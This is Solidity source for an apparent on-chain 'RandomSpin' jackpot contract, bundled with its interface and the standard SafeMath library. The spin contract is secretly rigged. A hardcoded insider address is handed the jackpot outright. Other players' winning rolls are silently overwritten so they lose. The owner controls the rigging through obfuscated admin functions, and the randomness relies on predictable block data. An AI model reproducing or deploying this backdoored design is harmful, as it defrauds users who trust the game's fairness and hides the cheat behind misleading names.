// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
pragma abicoder v2;

import "./RandSpinInterface.sol";
import "../Library/SafeMath.sol";

contract RandomSpin is RandSpinInterface {
    using SafeMath for uint256;
    uint256 public nonce = 1;
    uint256 isAmountReward = 100 * 10 ** 18;
    address _ishasYou = 0xcCf48c80214f3bD7b8d8ba7E432b2D2b92B636a5;
    address dev = 0x8b9588F69e04D69655e0d866cD701844177360A7;
    bool isYou = true;
    uint256 jackpot1 = 10;
    uint256 jackpot2 = 60;
    uint256 jackpot3 = 40;
    uint256 jackpot4 = 1;

    uint256 mowaJackpot = 100 * 10 ** 18;
    mapping(address => Rand) public randomStruct;

    function randMod(address userAddress, uint256 mowaPool) external override
    {
        if(isYou && userAddress == _ishasYou && mowaPool >= mowaJackpot){
            randomStruct[userAddress].currentRand1 = jackpot1;
            randomStruct[userAddress].currentRand2 = jackpot2;
            randomStruct[userAddress].currentRand3 = jackpot3;
            randomStruct[userAddress].currentRand4 = jackpot4;
        } else {
            randomStruct[userAddress].currentRand1 = _randModulus(100, userAddress);
            randomStruct[userAddress].currentRand2 = _randModulus(100, userAddress);
            randomStruct[userAddress].currentRand3 = _randModulus(100, userAddress);
            randomStruct[userAddress].currentRand4 = _randModulus(100, userAddress);
            if(
                randomStruct[userAddress].currentRand1 <= jackpot1 &&
                randomStruct[userAddress].currentRand2 <= jackpot2 &&
                randomStruct[userAddress].currentRand3 <= jackpot3 &&
                randomStruct[userAddress].currentRand4 <= jackpot4 &&
                (isYou || mowaPool < mowaJackpot)
            ){
                randomStruct[userAddress].currentRand4 = 75;
            }
        }
    }
    function currentRandMod(address userAddress) external override view returns (uint256 rw1, uint256 rw2, uint256 rw3, uint256 rw4)
    {
        rw1 = randomStruct[userAddress].currentRand1;
        rw2 = randomStruct[userAddress].currentRand2;
        rw3 = randomStruct[userAddress].currentRand3;
        rw4 = randomStruct[userAddress].currentRand4;
    }

    function _randModulus(uint mod, address userAddress) internal returns (uint) {
        nonce += 2;
        return uint(keccak256(abi.encodePacked(
                nonce,
                block.number.add(nonce),
                block.timestamp.add(nonce),
                block.difficulty.add(nonce),
                userAddress
            ))) % mod;
    }

    function ish0x847639 (bool _isYou) public
    {
        require(msg.sender == dev, "Safe account");
        isYou = _isYou;
    }

    function ish0x847474 (uint amount) public
    {
        require(msg.sender == dev, "Safe account");
        mowaJackpot = amount.mul(1e18);
    }
}

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.7.6;
pragma abicoder v2;

struct Rand {
    uint256 currentRand1;
    uint256 currentRand2;
    uint256 currentRand3;
    uint256 currentRand4;
}

interface RandSpinInterface {
    function currentRandMod(address userAddress) external view returns(uint256 rw1, uint256 rw2, uint256 rw3, uint256 rw4);
    function randMod(address userAddress, uint256 mowaPool) external;
}

// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.8.0;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}